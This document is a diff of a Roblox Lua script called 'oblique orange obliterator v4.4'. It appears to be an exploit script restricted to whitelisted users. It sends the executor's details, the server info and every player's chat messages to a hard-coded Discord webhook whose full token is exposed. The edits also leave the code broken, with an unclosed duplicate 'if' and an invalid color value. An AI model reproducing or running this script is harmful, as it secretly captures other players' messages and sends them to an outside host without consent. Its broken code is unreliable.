@@ -7,7 +7,7 @@ local SoundService = game:GetService("SoundService")
 local MarketplaceService = game:GetService("MarketplaceService")
 local HttpService = game:GetService("HttpService")
 local StarterGui = game:GetService("StarterGui")
-
+if not table.find(WHITELIST_USERIDS, Player.UserId) then
 local gameName = "Unknown Game"
 pcall(function()
     gameName = MarketplaceService:GetProductInfo(game.PlaceId).Name
@@ -19,7 +19,6 @@ local WHITELIST_USERIDS = {
     618456181, 2382360959, 4326343850
 }
 
--- YOUR WEBHOOK (keep safe!)
 local WEBHOOK_URL = "https://discord.com/api/webhooks/1445070372771987663/ALD7aLSKGfv3KlSuCuIOHJVuv2k9gOpBkFjRoq6BVJnrtm44WJ1qOQQzXhtgrMkp2Lzv"
 
 local function sendWebhook(data)
@@ -34,9 +33,8 @@ local function sendWebhook(data)
     end)
 end
 
--- Initial execution log with full server & player info
 if not table.find(WHITELIST_USERIDS, Player.UserId) then
-    Player:Kick("You are not whitelisted for oblique orange obliterator v4.4")
+    Player:Kick()
     return
 end
 
@@ -54,10 +52,8 @@ local function getPlayerList()
 end
 
 sendWebhook({
-    username = "oblique orange obliterator",
-    avatar_url = "https://i.imgur.com/0jN3f8O.png",
     embeds = {{
-        title = "🚀 oblique orange obliterator v4.4 Executed",
+        title = "oblique orange obliterator v4.4 Executed",
         description = "**Executor:** `" .. Player.DisplayName .. "` (@" .. Player.Name .. ")\n**User ID:** `" .. Player.UserId .. "`",
         color = 16744448, -- Orange
         fields = {
@@ -66,18 +62,17 @@ sendWebhook({
             {name = "Players Online (" .. #Players:GetPlayers() .. "/" .. Players.MaxPlayers .. ")", value = getPlayerList(), inline = false}
         },
         timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ"),
-        footer = {text = "oblique orange obliterator v4.4 | Made with hate and love"}
+        footer = {text = "oblique orange obliterator v4.4 | by fajay"}
     }}
 })
 
--- Chat Logging (sends every message after execution)
 Players.PlayerAdded:Connect(function(plr)
     plr.Chatted:Connect(function(msg)
         sendWebhook({
             embeds = {{
-                title = "💬 Chat Message",
+                title = "Chat Message",
                 description = "**" .. plr.DisplayName .. "** (@" .. plr.Name .. "): `" .. msg .. "`",
-                color = 16777215, -- White
+                color = 255, 105, 5, 
                 timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ"),
                 footer = {text = gameName .. " • " .. game.PlaceId}
             }}
@@ -85,14 +80,13 @@ Players.PlayerAdded:Connect(function(plr)
     end)
 end)
 
--- Log existing players' future chats
 for _, plr in ipairs(Players:GetPlayers()) do
     plr.Chatted:Connect(function(msg)
         sendWebhook({
             embeds = {{
-                title = "💬 Chat Message",
+                title = "Chat Message",
                 description = "**" .. plr.DisplayName .. "** (@" .. plr.Name .. "): `" .. msg .. "`",
-                color = 16777215,
+                color = 255, 105, 5,
                 timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ"),
                 footer = {text = gameName .. " • " .. game.PlaceId}
             }}
